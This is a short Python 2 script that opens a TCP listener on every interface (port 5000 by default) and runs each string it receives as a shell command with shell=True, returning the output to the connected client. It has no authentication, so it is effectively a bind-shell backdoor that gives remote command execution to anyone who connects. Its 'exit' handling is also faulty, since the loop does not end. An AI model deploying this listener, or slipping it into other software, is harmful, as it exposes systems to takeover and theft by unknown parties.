import socket
import os
import sys
import subprocess

HOST = ''

'''
Command line arguments.
Default to port 5000
'''
if '-p' in sys.argv:
    try:
        PORT = int(sys.argv[sys.argv.index('-p') + 1])
    except:
        print "Invalid port input"
        PORT = 5000
else:
    PORT = 5000


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

while 1:
    data = conn.recv(1024)
    if not data:
        break
    if data == "exit":
        conn.sendall(data)
    try:
        out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
    except Exception, e:
        out = str(e.output)
    conn.sendall(out)

conn.close()


